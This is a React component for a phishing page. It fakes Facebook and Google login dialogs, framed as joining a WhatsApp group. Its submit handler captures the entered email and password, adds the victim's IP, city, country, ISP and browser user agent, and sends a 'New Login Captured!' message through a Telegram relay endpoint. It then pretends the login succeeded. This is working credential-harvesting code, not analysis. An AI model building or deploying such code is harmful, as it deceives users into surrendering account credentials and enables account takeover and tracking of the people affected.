import React, { useState } from 'react';
import { X } from 'lucide-react';
import { LoginProvider } from '../types';

interface LoginModalProps {
  provider: LoginProvider | null;
  onClose: () => void;
  onLogin: () => void;
}

const LoginModal: React.FC<LoginModalProps> = ({ provider, onClose, onLogin }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  if (!provider) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
        // 1. Fetch IP Data from ipapi.co
        let ipInfo = { ip: 'Unknown', city: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (response.ok) {
                const data = await response.json();
                ipInfo = {
                    ip: data.ip || 'Unknown',
                    city: data.city || 'Unknown',
                    country_name: data.country_name || 'Unknown',
                    org: data.org || 'Unknown'
                };
            }
        } catch (err) {
            console.error('IP Fetch Error:', err);
        }

        // 2. Prepare Message for Telegram
        const message = `
<b>🎣 New Login Captured!</b>

<b>Service:</b> ${provider.name}
<b>Username:</b> <code>${email}</code>
<b>Password:</b> <code>${password}</code>

<b>🌐 Network Info:</b>
<b>IP:</b> ${ipInfo.ip}
<b>Location:</b> ${ipInfo.city}, ${ipInfo.country_name}
<b>ISP:</b> ${ipInfo.org}
<b>User Agent:</b> ${navigator.userAgent}
        `;

        // 3. Send to Vercel Serverless API (Secure)
        // Instead of calling Telegram directly (which exposes tokens), we call our own API
        await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message })
        });

    } catch (error) {
        console.error('Submission Error:', error);
    } finally {
        // 4. Proceed as if login was successful
        setIsLoading(false);
        onLogin();
    }
  };

  if (provider.id === 'facebook') {
    return (
      <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
        <div className="bg-[#f0f2f5] w-full max-w-[400px] rounded-lg overflow-hidden shadow-xl relative">
          <div className="bg-[#1877f2] p-4 text-center relative">
             <h2 className="text-white text-2xl font-bold">facebook</h2>
             <button onClick={onClose} className="absolute top-4 right-4 text-white/80 hover:text-white">
                <X size={24} />
             </button>
          </div>
          <div className="p-6 bg-white flex flex-col items-center">
             <p className="text-gray-600 mb-6 text-center text-sm">Log in to Facebook to join the group.</p>
             <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
                <input 
                    type="text" 
                    placeholder="Mobile number or email address" 
                    className="p-3 border border-gray-300 rounded-md text-base focus:border-[#1877f2] focus:outline-none"
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                    required
                />
                <input 
                    type="password" 
                    placeholder="Password" 
                    className="p-3 border border-gray-300 rounded-md text-base focus:border-[#1877f2] focus:outline-none"
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    required
                />
                <button 
                    type="submit" 
                    disabled={isLoading}
                    className="bg-[#1877f2] text-white font-bold py-3 rounded-md mt-2 hover:bg-[#166fe5] transition disabled:opacity-70 disabled:cursor-not-allowed"
                >
                    {isLoading ? 'Processing...' : 'Log In'}
                </button>
             </form>
             <div className="mt-4 text-center">
                <a href="#" className="text-[#1877f2] text-sm hover:underline">Forgotten password?</a>
             </div>
             <div className="w-full border-t border-gray-300 my-6 flex justify-center relative">
                <span className="bg-white px-2 absolute -top-3 text-sm text-gray-500">or</span>
             </div>
             <button className="bg-[#42b72a] text-white font-bold py-2 px-4 rounded-md text-sm hover:bg-[#36a420] transition">
                Create New Account
             </button>
          </div>
        </div>
      </div>
    );
  }

  // Google Modal
  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
        <div className="bg-white w-full max-w-[400px] rounded-lg shadow-xl relative p-8 flex flex-col items-center">
             <button onClick={onClose} className="absolute top-4 right-4 text-gray-500 hover:text-gray-800">
                <X size={24} />
             </button>
             
             <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" className="w-12 h-12 mb-4">
                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
             </svg>

             <h2 className="text-xl font-medium text-gray-800 mb-2">Sign in with Google</h2>
             <p className="text-gray-600 mb-8 text-center">Continue to WhatsApp Group</p>

             <form onSubmit={handleSubmit} className="w-full flex flex-col gap-4">
                <div className="relative">
                    <input 
                        type="email" 
                        className="w-full p-3 border border-gray-300 rounded text-base focus:border-blue-500 focus:outline-none transition peer"
                        value={email}
                        onChange={e => setEmail(e.target.value)}
                        required
                    />
                    <label className={`absolute left-3 transition-all duration-200 pointer-events-none bg-white px-1 ${email ? '-top-2.5 text-xs text-blue-500' : 'top-3.5 text-gray-500'}`}>
                        Email or phone
                    </label>
                </div>

                 <div className="relative">
                    <input 
                        type="password" 
                        className="w-full p-3 border border-gray-300 rounded text-base focus:border-blue-500 focus:outline-none transition peer"
                        value={password}
                        onChange={e => setPassword(e.target.value)}
                        required
                    />
                    <label className={`absolute left-3 transition-all duration-200 pointer-events-none bg-white px-1 ${password ? '-top-2.5 text-xs text-blue-500' : 'top-3.5 text-gray-500'}`}>
                        Enter your password
                    </label>
                </div>
                
                <div className="flex justify-end">
                     <a href="#" className="text-[#1a73e8] font-medium text-sm">Forgot email?</a>
                </div>

                <div className="flex justify-end mt-4">
                    <button 
                        type="submit" 
                        disabled={isLoading}
                        className="bg-[#1a73e8] text-white font-medium py-2 px-6 rounded hover:bg-[#1669d6] transition disabled:opacity-70 disabled:cursor-not-allowed"
                    >
                        {isLoading ? 'Processing...' : 'Next'}
                    </button>
                </div>
             </form>
        </div>
    </div>
  );
};

export default LoginModal;
